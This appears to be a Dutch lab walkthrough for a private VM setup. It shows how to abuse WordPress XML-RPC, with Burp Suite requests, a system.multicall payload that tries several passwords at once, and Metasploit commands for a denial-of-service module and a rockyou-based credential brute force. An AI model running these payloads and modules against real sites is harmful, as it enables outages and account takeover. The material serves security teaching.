## Environment setup  

Debian 11 VM
running wordpress 5.0.0: https://wordpress.org/download/releases/#branch-50  

Kali VM 
running metasploit

## Xmlrpc.php exploit 

**General**  

CVE: https://www.cvedetails.com/cve/CVE-2020-28035/

Wordpress vóór versie 5.5.2 gebruikte XML-RPC, Een remote procedure call (RPC) Dat externe applicaties en diensten in staat stelde om met een Wordpress-site te communiceren. Het bood zo een manier aan voor deze applicaties om verschillende taken en functies uit te voeren. 

Maar XML-RPC had een aantal beveiligings- en prestatieproblemen.

**Burp Suite en XML POSTS**


Instructions:

        Open browser
        browse naar (wordpresserver)/xmlrpc.php
        Dit zou "XML-RPC server accepts POST requests only." 
        moeten teruggeven, zo weet je dat xmlrpc aanstaat op de 
        wordpress server

        Open burp suite
        selecteer de proxy tab
        Open browser via proxy tab en ga naar (wordpresserver)/xmlrpc.php
        klik op forward tot je de juiste request krijgt.
        send deze request naar de repeater (via actions)

        open de repeater tab
        verander de GET naar POST

        en injecteer de XML payload

        <methodCall>
        <methodName>wp.getUsersBlogs</methodName>
        <params>
        <param><value>admin</value></param>
        <param><value>pass</value></param>
        </params>
        </methodCall>

        klik dan op Send.

Zoals je kunt zien, maakt XML-RPC het mogelijk om zelf verzoeken naar WordPress te sturen en te controleren of u kunt inloggen. Het meest cruciale aspect hierbij is het volgende:

Het belangrijkste verschil tussen een verzoek via XML-RPC en de WordPress-website zelf, is dat XML-RPC meerdere verzoeken in één enkele POST-aanvraag kan bundelen, zelfs honderden. Dit noemt een multicall. Desondanks wordt dit voor de webserver geregistreerd als slechts één POST-verzoek. Hierdoor kan het duizenden wachtwoorden en functies uitvoeren met een minimaal aantal POST-verzoeken.

Een voorbeeld: 

        Vervang de XML payload met:

         <methodCall>
        <methodName>system.multicall</methodName>
        <params>
            <param>
            <value>
                <array>
                <data>
                    <value>
                    <struct>
                        <member>
                        <name>methodName</name>
                        <value><string>wp.getUsersBlogs</string></value>
                        </member>
                        <member>
                        <name>params</name>
                        <value>
                            <array>
                            <data>
                                <value><string>admin</string></value>
                                <value><string>password1</string></value>
                            </data>
                            </array>
                        </value>
                        </member>
                    </struct>
                    </value>
                    <value>
                    <struct>
                        <member>
                        <name>methodName</name>
                        <value><string>wp.getUsersBlogs</string></value>
                        </member>
                        <member>
                        <name>params</name>
                        <value>
                            <array>
                            <data>
                                <value><string>admin</string></value>
                                <value><string>password2</string></value>
                            </data>
                            </array>
                        </value>
                        </member>
                    </struct>
                    </value>
                </data>
                </array>
            </value>
            </param>
        </params>
        </methodCall>

Zoals je kan zien antwoord de server op alle calls in de multicall.
Dit opent de server voor DOS aanvallen met een kleine hoeveelheid POST calls en 
nog belangrijker, brute force attacks die een stuk minder opvallend zijn dan alternatieven. 

We zullen beiden tonen aan de hand van het metasploit framework.

instructies:

        Open de Kali VM
        username: osboxes
        ww: osboxes.org
        Open het metasploit framwork (kan via de search bar)

**DOS attack**  

In de debian VM:

        top

In de Kali VM:

        search wordpress_xmlrpc
        use auxiliary/dos/http/wordpress_xmlrpc_dos 
        set RHOSTS 192.168.1.60
        set RPORT 80
        set RLIMIT 10000000
        show options
        run

Ga nu naar de Debian vm en toon de cpu usage

**Brute force credentials**  

In de Kali VM:
        cd /usr/share/wordlists
        sudo gzip -d rockyou.txt.gz

        sudo nano /usr/share/wordlists/names.txt

        msfconsole
        search wordpress_xmlrpc
        use auxiliary/scanner/http/wordpress_xmlrpc_login
        set RHOSTS 192.168.1.60
        set USER_FILE /usr/share/wordlists/names.txt
        set PASS_FILE /usr/share/wordlists/rockyou.txt
        set STOP_ON_SUCCESS true
        run